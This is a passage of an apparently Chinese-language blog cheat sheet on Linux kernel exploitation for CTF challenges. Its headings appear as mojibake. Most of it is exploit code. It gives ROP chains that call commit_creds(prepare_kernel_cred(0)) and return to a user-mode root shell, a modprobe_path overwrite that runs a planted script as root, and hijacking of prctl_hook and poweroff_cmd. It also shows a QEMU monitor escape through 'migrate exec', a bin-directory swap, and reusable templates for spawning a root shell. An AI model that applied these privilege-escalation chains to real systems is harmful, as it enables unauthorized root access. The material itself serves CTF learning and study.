CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>


        <h5 id="ROPåœ¨å†…æ ¸æ€ææƒåè¿”å›ç”¨æˆ·æ€èµ·Shell"   >
          <a href="#ROPåœ¨å†…æ ¸æ€ææƒåè¿”å›ç”¨æˆ·æ€èµ·Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#ROPåœ¨å†…æ ¸æ€ææƒåè¿”å›ç”¨æˆ·æ€èµ·Shell" class="headerlink" title="ROPåœ¨å†…æ ¸æ€ææƒåè¿”å›ç”¨æˆ·æ€èµ·Shell"></a>ROPåœ¨å†…æ ¸æ€ææƒåè¿”å›ç”¨æˆ·æ€èµ·Shell</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred_k;  </span><br><span class="line">rop[i++] = pop_rdx_rbx_rbp_ret;</span><br><span class="line">rop[i++] = pop_rbp_ret;</span><br><span class="line">rop[i++] = <span class="number">0x0</span>;      </span><br><span class="line">rop[i++] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">rop[i++] = movRdiRax_call_rdx; </span><br><span class="line">rop[i++] = commit_creds_k;</span><br><span class="line">rop[i++] = swapgs_ret;              </span><br><span class="line">rop[i++] = iretq;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡æœªå¼€å¯SMEPæƒ…å†µ"   >
          <a href="#â‘¡æœªå¼€å¯SMEPæƒ…å†µ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡æœªå¼€å¯SMEPæƒ…å†µ" class="headerlink" title="â‘¡æœªå¼€å¯SMEPæƒ…å†µ"></a>â‘¡æœªå¼€å¯SMEPæƒ…å†µ</h4>
      <p>ç›´æ¥è°ƒç”¨ç”¨æˆ·ç©ºé—´çš„ææƒä»£ç ï¼Œè¿”å›ä¹‹åèµ·shellå³å¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret; </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      <span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>

<p>(2)</p>

        <h2 id="3-mmapå†…å­˜æ˜ å°„"   >
          <a href="#3-mmapå†…å­˜æ˜ å°„" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-mmapå†…å­˜æ˜ å°„" class="headerlink" title="3.mmapå†…å­˜æ˜ å°„"></a>3.mmapå†…å­˜æ˜ å°„</h2>
      <p>è¿˜æ²¡çœ‹å¤ªæ‡‚ï¼Œæ¶‰åŠæ–‡ä»¶ç³»ç»Ÿå’Œé©±åŠ¨çš„å†…å­˜æ˜ å°„</p>
<p>å¯ä»¥å‚è€ƒ<code>LINECTF-2022-ecrypt</code>ï¼Œåé¢æœ‰æåˆ°å€ŸåŠ©kern_tableæ•°ç»„æ¥åˆ©ç”¨</p>

        <h2 id="4-å¸¸è§ææƒæ‰‹æ®µ"   >
          <a href="#4-å¸¸è§ææƒæ‰‹æ®µ" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å¸¸è§ææƒæ‰‹æ®µ" class="headerlink" title="4.å¸¸è§ææƒæ‰‹æ®µ"></a>4.å¸¸è§ææƒæ‰‹æ®µ</h2>
      
        <h3 id="ä¿®æ”¹modprobe-path"   >
          <a href="#ä¿®æ”¹modprobe-path" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¿®æ”¹modprobe-path" class="headerlink" title="ä¿®æ”¹modprobe_path"></a>ä¿®æ”¹modprobe_path</h3>
      <p>è¿™ä¸ªè®¾æ–¹æ³•å¦‚æœå¼€å¯å¦‚ä¸‹é…ç½®åˆ™ä¸å¯ç”¨ï¼Œè¡¨ç¤º<code>modprobe_path</code>ä¸ºåªè¯»ï¼Œä¸å¯ä¿®æ”¹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//v4.11åŠä¹‹åå­˜åœ¨</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></div></figure>

<p>å¸¸å¸¸ç»“åˆUAFæ¼æ´æ¥ä»»æ„ç”³è¯·</p>
<p>starctf2019-hackmeâ€“<a href="https://pig-007.github.io/2021/08/14/starctf2019-hackme/">starctf2019-hackme | PIG-007</a></p>
<p>è¥¿æ¹–è®ºå‰‘â€“easy_kernelâ€“<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.crisprx.top/archives/495" >2021 è¥¿æ¹–è®ºå‰‘ çº¿ä¸Šåˆèµ› WP â€“ Crispr â€“çƒ­çˆ±æŠ€æœ¯å’Œç”Ÿæ´» (crisprx.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms| grep modprobe_path</span><br></pre></td></tr></table></div></figure>

<p>å¦‚æœæ²¡æœ‰çš„è¯ï¼Œå¯ä»¥å…ˆçœ‹å€ŸåŠ©<code>kallsyms</code>æ¥<code>__request_module</code>å‡½æ•°çš„åœ°å€ï¼Œç„¶åæŸ¥çœ‹è¯¥å‡½æ•°çš„æ±‡ç¼–ï¼Œè·å–<code>modprobe_path</code>çš„å¼•ç”¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281447847.png" alt="image-20220328144717290"></p>
<p>ç„¶ååˆ¶ä½œä¸€ä¸ªæ‹·è´flagå¹¶ä¸”æ”¹æƒé™çš„copy.shæ–‡ä»¶ï¼Œä½¿å¾—modprobe_pathæŒ‡å‘è¯¥æ–‡ä»¶ï¼Œç„¶åè¿è¡Œä¸€ä¸ªé”™è¯¯æ ¼å¼çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå‡ºé”™ä¹‹åå°±ä¼šä»¥rootæƒé™è¿è¡Œmodprobe_pathï¼Œä»è€Œä»¥rootæƒé™è¿è¡Œæˆ‘ä»¬çš„copy.shï¼Œä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿè¯»å–flagäº†ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>(mem,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line">write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cat flag&quot;</span>);</span><br></pre></td></tr></table></div></figure>


        <h3 id="ä¿®æ”¹init-cred"   >
          <a href="#ä¿®æ”¹init-cred" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¿®æ”¹init-cred" class="headerlink" title="ä¿®æ”¹init_cred"></a>ä¿®æ”¹init_cred</h3>
      <p>initè¿›ç¨‹æ˜¯åˆå§‹è¿›ç¨‹ï¼Œä¸è¢«åŠ¨æ€åˆ†é…ï¼ŒçŸ¥é“kernelåŸºåœ°å€çš„æ—¶å€™ï¼Œå°±èƒ½å¾—åˆ°è¯¥ç»“æ„ä½“çš„åœ°å€ã€‚</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms |grep init_cred</span><br></pre></td></tr></table></div></figure>

<p>è¿™ç§æ–¹æ³•ä¸€èˆ¬ç”¨åœ¨æ²¡åŠæ³•ä¿®æ”¹åˆ°æœ¬è¿›ç¨‹çš„credç»“æ„ä½“çš„æ—¶å€™ï¼Œä¹‹åä½¿ç”¨å³å¯ææƒ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//pop_rdi_ret init_cred_addr commit_creds_addrå³å¯</span></span><br><span class="line">commit_creds(&amp;init_cred)</span><br></pre></td></tr></table></div></figure>


        <h3 id="åŠ«æŒprtcl-hook"   >
          <a href="#åŠ«æŒprtcl-hook" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŠ«æŒprtcl-hook" class="headerlink" title="åŠ«æŒprtcl_hook"></a>åŠ«æŒprtcl_hook</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://localhost:4000/2021/10/19/Kernel%E4%BB%8E0%E5%BC%80%E5%A7%8B(%E5%9B%9B)/#3-%E5%8A%AB%E6%8C%81prctl%E5%87%BD%E6%95%B0" >pwnKernelä»0å¼€å§‹(å››) | PIG-007</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prctl-&gt;security_task_prctl-&gt;prctl_hook-&gt;orderly_poweroff-&gt;__orderly_poweroff-&gt;run_cmd(poweroff_cmd)-&gt; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)</span><br><span class="line"></span><br><span class="line">prctl-&gt;security_task_prctl-&gt;prctl_hook-&gt;poweroff_work_fun-&gt;run_cmd(poweroff_cmd)-&gt; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)</span><br></pre></td></tr></table></div></figure>


        <h4 id="1-åŠ«æŒä¸ºorderly-poweroffå‡½æ•°"   >
          <a href="#1-åŠ«æŒä¸ºorderly-poweroffå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åŠ«æŒä¸ºorderly-poweroffå‡½æ•°" class="headerlink" title="(1)åŠ«æŒä¸ºorderly_poweroffå‡½æ•°"></a>(1)åŠ«æŒä¸ºorderly_poweroffå‡½æ•°</h4>
      <p>åŠ«æŒè¯¥hookä¸ºorderly_poweroffå‡½æ•°ï¼Œç„¶åè°ƒç”¨prctlå‡½æ•°å³å¯æ“çºµç¨‹åºæµè¿›å…¥<code>orderly_poweroff</code>å‡½æ•°ï¼Œå†åŠ«æŒ<code>poweroff_cmd</code>å³å¯é¡ºç€<code>orderly_poweroff</code>å‡½æ•°æ¥è¿è¡Œ<code>call_usermodehelper(poweroff_cmd)</code>ï¼Œè¯¥å‡½æ•°æ˜¯ä»¥rootæƒé™è¿è¡Œï¼Œæ‰€ä»¥èƒ½å¤Ÿç›´æ¥ææƒï¼Œä¸è¿‡ä¸€èˆ¬è¿è¡Œä¸€ä¸ªåå¼¹shellçš„ç¨‹åºã€‚å½“ç„¶å¦‚æœæœ‰KASLRå°±è¦çˆ†ç ´æˆ–è€…æ³„éœ²äº†ã€‚</p>
<p>æœ€åéœ€è¦æ‰§è¡Œ<code>prctl(0,0)</code>ï¼›</p>

        <h4 id="2-åŠ«æŒä¸ºpoweroff-work-funå‡½æ•°"   >
          <a href="#2-åŠ«æŒä¸ºpoweroff-work-funå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åŠ«æŒä¸ºpoweroff-work-funå‡½æ•°" class="headerlink" title="(2)åŠ«æŒä¸ºpoweroff_work_funå‡½æ•°"></a>(2)åŠ«æŒä¸ºpoweroff_work_funå‡½æ•°</h4>
      <p>ä¸åŠ«æŒ<code>orderly_poweroff</code>å‡½æ•°åŒç†ï¼ŒåŠ«æŒä¸º<code>poweroff_work_fun</code>å‡½æ•°ä¹Ÿå¯ä»¥ä»¥rootæƒé™æ‰§è¡Œ<code>poweroff_cmd</code></p>

        <h4 id="3-è·å–åœ°å€"   >
          <a href="#3-è·å–åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è·å–åœ°å€" class="headerlink" title="(3)è·å–åœ°å€"></a>(3)è·å–åœ°å€</h4>
      
        <h5 id="â‘ prctl-hook"   >
          <a href="#â‘ prctl-hook" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ prctl-hook" class="headerlink" title="â‘ prctl_hook"></a>â‘ prctl_hook</h5>
      <p>å¯ä»¥é€šè¿‡ç¼–å†™ä¸€ä¸ªå°ç¨‹åºï¼Œç„¶åç»™<code>security_task_prctl</code>å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œåˆ°<code>call QWORD PTR[rbx+0x18]</code>å³å¯çœ‹åˆ°å¯¹åº”çš„rbx+0x18ä¸Šå­˜æ”¾çš„åœ°å€ï¼Œå³å¯è·å–åˆ°<code>prct_hook_addr</code>ï¼ŒåŠ«æŒä¿®æ”¹å³å¯</p>

        <h5 id="â‘¡poweroff-cmdã€orderly-poweroffã€poweroff-work-fun"   >
          <a href="#â‘¡poweroff-cmdã€orderly-poweroffã€poweroff-work-fun" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡poweroff-cmdã€orderly-poweroffã€poweroff-work-fun" class="headerlink" title="â‘¡poweroff_cmdã€orderly_poweroffã€poweroff_work_fun"></a>â‘¡poweroff_cmdã€orderly_poweroffã€poweroff_work_fun</h5>
      <p>poweroff_cmdæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå¯ä»¥ç›´æ¥è·å–åœ°å€ç„¶åä¿®æ”¹ã€‚å¯ä»¥ç›´æ¥ä½¿ç”¨nmå‘½ä»¤æ¥è·å–ï¼Œæˆ–è€…ç›´æ¥è¿›å…¥gdbæ‰“å°å³å¯ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247187.png" alt="image-20211021105456058"></p>
<p>æ­¤å¤–orderly_poweroffä¹Ÿæ˜¯ä¸€æ ·çš„è·å–ã€‚å¦‚æœæ— æ³•æŸ¥åˆ°ï¼Œé‚£ä¹ˆå¯ä»¥å¯åŠ¨qemuï¼Œå…ˆè®¾ç½®ä¸ºrootæƒé™å</p>
<p><code>cat /proc/kallsyms | grep &quot;orderly_poweroff&quot;</code>å³å¯ï¼Œæˆ–è€…ç¼–è¯‘ä¸€ä¸ªå¯¹åº”ç‰ˆæœ¬çš„å†…æ ¸è¿›è¡ŒæŸ¥è¯¢ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247302.png" alt="image-20211021105603666"></p>
<p><code>poweroff_work_fun</code>å‡½æ•°ä¹Ÿæ˜¯ç±»ä¼¼çš„è·å–æ–¹å¼</p>

        <h1 id="ä¸ƒã€æ„æƒ³ä¸åˆ°çš„æ–¹å¼"   >
          <a href="#ä¸ƒã€æ„æƒ³ä¸åˆ°çš„æ–¹å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸ƒã€æ„æƒ³ä¸åˆ°çš„æ–¹å¼" class="headerlink" title="ä¸ƒã€æ„æƒ³ä¸åˆ°çš„æ–¹å¼"></a>ä¸ƒã€æ„æƒ³ä¸åˆ°çš„æ–¹å¼</h1>
      
        <h2 id="1-QEMUé€ƒé€¸"   >
          <a href="#1-QEMUé€ƒé€¸" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-QEMUé€ƒé€¸" class="headerlink" title="1.QEMUé€ƒé€¸"></a>1.QEMUé€ƒé€¸</h2>
      <p>å½“æ²¡æœ‰å…³é—­monitoræ—¶ï¼Œå¯ä»¥ç›´æ¥ctrl+A Cè¿›å»é€ƒé€¸ï¼Œè§£å‹rootfs.imgè¯»flag</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">migrate <span class="string">&quot;exec:cp rootfs.img /tmp &quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cd /tmp;zcat rootfs.img | cpio -idmv 1&gt;&amp;2&quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">(qemu) migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">flag&#123;test_flag&#125;qemu-system-x86_64: failed to save SaveStateEntry with id(name):)</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zcat rootfs.cpio | cpio -idmv 1&gt;&amp;2</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-æƒé™åŠç›¸å…³é…ç½®é—®é¢˜"   >
          <a href="#2-æƒé™åŠç›¸å…³é…ç½®é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æƒé™åŠç›¸å…³é…ç½®é—®é¢˜" class="headerlink" title="2.æƒé™åŠç›¸å…³é…ç½®é—®é¢˜"></a>2.æƒé™åŠç›¸å…³é…ç½®é—®é¢˜</h2>
      <p>æœ‰çš„æ ¹ç›®å½•æˆ–è€…binç›®å½•çš„æ‰€æœ‰è€…ä¸æ˜¯rootæ—¶</p>

        <h3 id="1-binç›®å½•ä¸ä¸ºROOT"   >
          <a href="#1-binç›®å½•ä¸ä¸ºROOT" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-binç›®å½•ä¸ä¸ºROOT" class="headerlink" title="(1)binç›®å½•ä¸ä¸ºROOT"></a>(1)binç›®å½•ä¸ä¸ºROOT</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021148186.png" alt="image-20220302114830086"></p>
<p>è¿™æ ·å¯ä»¥ä¿®æ”¹biné‡Œé¢çš„å‘½ä»¤ï¼Œè€Œinitè„šæœ¬åœ¨é€€å‡ºæ—¶ï¼Œé€šå¸¸åŒ…å«poweroffå‘½ä»¤ï¼Œæˆ–è€…umountå‘½ä»¤ï¼Œè€Œinitè¿è¡Œæ—¶æ˜¯ä»¥rootæƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¿™äº›å‘½ä»¤ä»è€Œåœ¨è¾“å…¥exitå‘½ä»¤è°ƒç”¨initä¸­åœ¨setsidå‰©ä¸‹çš„å‘½ä»¤æ—¶æ¥ç›´æ¥cat flagæˆ–è€…è·å¾—shell</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021149995.png" alt="image-20220302114945940"></p>

        <h3 id="2-æ ¹ç›®å½•ä¸ä¸ºROOT"   >
          <a href="#2-æ ¹ç›®å½•ä¸ä¸ºROOT" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ ¹ç›®å½•ä¸ä¸ºROOT" class="headerlink" title="(2)æ ¹ç›®å½•ä¸ä¸ºROOT"></a>(2)æ ¹ç›®å½•ä¸ä¸ºROOT</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021152377.png" alt="image-20220302115207278"></p>
<p>é‚£ä¹ˆåœ¨æ ¹ç›®å½•ä¸‹ï¼Œè™½ç„¶binçš„æ‰€æœ‰è€…ä¸ºrootï¼Œä½†æ˜¯ç¼ºå¯ä»¥å¯¹binè¿›è¡Œæ”¹åï¼Œç„¶åæˆ‘ä»¬ä¼ªé€ ä¸€ä¸ªbinç›®å½•ï¼Œé‡Œé¢æ”¾ä¸Šæˆ‘ä»¬ä¼ªé€ çš„å‘½ä»¤ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä»¥rootæƒé™è°ƒç”¨è¿™ä¸ªä¼ªé€ çš„å‘½ä»¤äº†ï¼Œå¦‚ä¸‹ä¸ºæ‰€ç¤ºä¾‹å­ã€‚</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mv bin evil_bin</span><br><span class="line">/evil_bin/mkdir bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/evil_bin/sh&quot;</span> &gt; /bin/power</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/evil_bin/sh&quot;</span> &gt;&gt; /bin/power</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="3-å¯†ç æœªè®¾ç½®"   >
          <a href="#3-å¯†ç æœªè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å¯†ç æœªè®¾ç½®" class="headerlink" title="(3)å¯†ç æœªè®¾ç½®"></a>(3)å¯†ç æœªè®¾ç½®</h3>
      <p>å¦‚æœrootè´¦å·çš„å¯†ç æ²¡æœ‰è®¾ç½®çš„è¯ï¼Œç›´æ¥suå³å¯ç™»å½•åˆ°rootï¼Œéé¢„æœŸçš„ã€‚</p>

        <h1 id="å…«ã€æ¨¡æ¿"   >
          <a href="#å…«ã€æ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…«ã€æ¨¡æ¿" class="headerlink" title="å…«ã€æ¨¡æ¿"></a>å…«ã€æ¨¡æ¿</h1>
      
        <h2 id="1-ä¿å­˜çŠ¶æ€"   >
          <a href="#1-ä¿å­˜çŠ¶æ€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¿å­˜çŠ¶æ€" class="headerlink" title="1.ä¿å­˜çŠ¶æ€"></a>1.ä¿å­˜çŠ¶æ€</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-ç”¨æˆ·æ€èµ·Shell"   >
          <a href="#2-ç”¨æˆ·æ€èµ·Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç”¨æˆ·æ€èµ·Shell" class="headerlink" title="2.ç”¨æˆ·æ€èµ·Shell"></a>2.ç”¨æˆ·æ€èµ·Shell</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span 